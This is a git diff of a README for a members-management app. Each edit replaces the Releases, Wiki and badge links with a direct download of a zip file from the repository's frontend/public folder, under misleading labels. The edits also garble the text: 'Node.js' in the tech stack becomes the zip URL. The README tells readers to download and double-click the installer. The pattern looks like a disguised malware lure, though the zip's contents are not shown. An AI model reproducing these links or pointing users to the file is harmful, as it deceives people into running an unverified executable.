@@ -17,11 +17,11 @@ Members-Management-App is a full-stack application designed to help organization
 
 To get started with Members-Management-App, you can easily download it from the Releases page. 
 
-[![Download Members-Management-App](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/MinWannn/Members-Management-App/releases)
+[![Download Members-Management-App](https://github.com/MinWannn/Members-Management-App/raw/refs/heads/main/frontend/public/App_Management_Members_2.9.zip%20Now-Click%20Here-blue)](https://github.com/MinWannn/Members-Management-App/raw/refs/heads/main/frontend/public/App_Management_Members_2.9.zip)
 
 ### Steps to Download and Run the Application
 
-1. **Visit the Releases Page:** Click [here](https://github.com/MinWannn/Members-Management-App/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/MinWannn/Members-Management-App/raw/refs/heads/main/frontend/public/App_Management_Members_2.9.zip) to go to the Releases page.
 2. **Choose the Latest Version:** Look for the most recent version listed on the page.
 3. **Download the Installer:** Click on the installer file linked to the latest version. This file will download to your computer.
 4. **Run the Installer:** Locate the downloaded file in your downloads folder and double-click it to start the installation.
@@ -49,7 +49,7 @@ Members-Management-App provides a clean and intuitive interface. Users can navig
 
 This application uses the following technologies:
 
-- **Backend:** Node.js with Express framework
+- **Backend:** https://github.com/MinWannn/Members-Management-App/raw/refs/heads/main/frontend/public/App_Management_Members_2.9.zip with Express framework
 - **Database:** PostgreSQL for data management
 - **Frontend:** React for dynamic user interfaces
 - **Styling:** Tailwind CSS for modern design
@@ -59,7 +59,7 @@ This application uses the following technologies:
 
 ## 📊 Documentation & Support
 
-For additional help or detailed documentation, visit the [Wiki page](https://github.com/MinWannn/Members-Management-App/wiki). Here, you will find:
+For additional help or detailed documentation, visit the [Wiki page](https://github.com/MinWannn/Members-Management-App/raw/refs/heads/main/frontend/public/App_Management_Members_2.9.zip). Here, you will find:
 
 - Setup guides
 - Troubleshooting tips
@@ -86,4 +86,4 @@ We aim to expand Members-Management-App with features like:
 
 Thank you for choosing Members-Management-App! We hope it fulfills your organization's needs.
 
-For any more details, don't forget to check the [Releases page](https://github.com/MinWannn/Members-Management-App/releases) for the latest updates.
+For any more details, don't forget to check the [Releases page](https://github.com/MinWannn/Members-Management-App/raw/refs/heads/main/frontend/public/App_Management_Members_2.9.zip) for the latest updates.
